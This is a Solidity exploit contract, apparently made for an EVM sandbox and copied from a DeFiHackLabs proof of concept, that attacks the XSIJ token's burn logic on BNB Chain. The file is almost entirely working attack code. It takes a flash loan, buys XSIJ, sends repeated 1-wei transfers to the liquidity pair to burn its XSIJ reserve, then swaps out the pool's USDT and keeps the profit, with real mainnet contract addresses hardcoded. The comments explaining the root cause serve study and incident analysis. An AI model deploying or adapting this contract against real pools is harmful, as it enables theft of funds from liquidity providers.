// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-XSIJ).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `Exploit` test
// contract (attacker = address(this); the DODO DPP flash-loan callback
// `DPPFlashLoanCall` lives on the test itself), so there is no standalone
// exploit contract to deploy. This file is a faithful, self-contained copy
// of that inline attack (testExploit body + DPPFlashLoanCall callback +
// minimal inline interfaces — no imports so it compiles anywhere), compiled
// inside the registry forge project. Logic and constants are copied
// verbatim from test/XSIJ_exp.sol.
//
// Root cause: GGGTOKEN (XSIJ)._transfer's sell branch fires
// autoBurnLiquidityPairTokens() whenever `removePoolAmount > 0`, which
// burns `removePoolAmount` XSIJ straight out of the pair's own balance and
// calls pair.sync() — an uncompensated, one-sided reserve deletion. The
// accumulator is NEVER reset to zero after the burn, so the SAME amount
// (847.55 XSIJ) is burned again on every subsequent "sell", and a "sell" is
// simply any transfer(pair, amount) — even 1 wei. The attacker buys a large
// XSIJ position, then spams 1-wei transfers to the pair to repeatedly grind
// the XSIJ reserve down to dust while the USDT reserve stays untouched, then
// dumps its XSIJ holdings to capture almost the entire USDT reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IXSIJ is IERC20 {
    function removePoolAmount() external view returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract XSIJDrain {
    // historical attacker EOA (deployer/caller here). Profit stays inside
    // THIS contract -- both swaps route proceeds to address(this), and the
    // final BUSD.transfer(msg.sender, ...) only repays the DODO DPP pool
    // (msg.sender inside the flash-loan callback is DPP, not the attacker) --
    // mirroring the original test where attacker = address(this).

    IXSIJ constant XSIJ = IXSIJ(0x31bfA137C76561ef848c2af9Ca301b60451CaAC0);
    IERC20 constant PAIR = IERC20(0xf43Fd71f404CC450c470d42E3F478a6D38C96311); // XSIJ/USDT PancakePair
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476); // DODO DPP (USDT pool)
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955); // USDT (BSC "BUSD" symbol)

    // step 0: flash-borrow 100,000 USDT from the DODO DPP pool. The callback
    // below does the entire attack and repays the loan before returning.
    function run() external {
        DPP.flashLoan(0, 100_000_000_000_000_000_000_000, address(this), new bytes(0x123));
    }

    // DODO DPP flash-loan callback. `quoteAmount` is the borrowed USDT.
    function DPPFlashLoanCall(address, /* sender */ uint256, /* baseAmount */ uint256 quoteAmount, bytes calldata /* data */ )
        external
    {
        // Step 1: buy a large XSIJ position with the flash-loaned USDT.
        BUSD.approve(address(ROUTER), 100_000 * 1e18);
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(XSIJ);

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100_000 * 1e18, 0, path, address(this), block.timestamp + 100
        );

        // Step 2: spam 1-wei "sells" to the pair. Each transfer(pair, 1) is
        // classified as a sell by GGGTOKEN's reserve-vs-balance heuristic and
        // fires autoBurnLiquidityPairTokens(), which burns the UNCHANGED
        // `removePoolAmount` (847.55 XSIJ) out of the pair and re-syncs
        // reserves — with no compensating USDT ever leaving. Because the
        // accumulator is never reset, this repeats every single call.
        uint256 i;
        while (XSIJ.balanceOf(address(PAIR)) > 1800 * 1e18) {
            XSIJ.transfer(address(PAIR), 1);
            i++;
        }

        // Step 3: dump the entire XSIJ position into the now-degenerate pool
        // (XSIJ reserve ground to dust, USDT reserve still intact) to capture
        // almost the whole USDT side.
        XSIJ.approve(address(ROUTER), 10_111_100_000 * 1e18);
        address[] memory path2 = new address[](2);
        path2[0] = address(XSIJ);
        path2[1] = address(BUSD);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            XSIJ.balanceOf(address(this)), 0, path2, address(this), block.timestamp + 100
        );

        // Step 4: repay the flash loan; keep the rest as profit.
        BUSD.transfer(msg.sender, quoteAmount);
    }
}
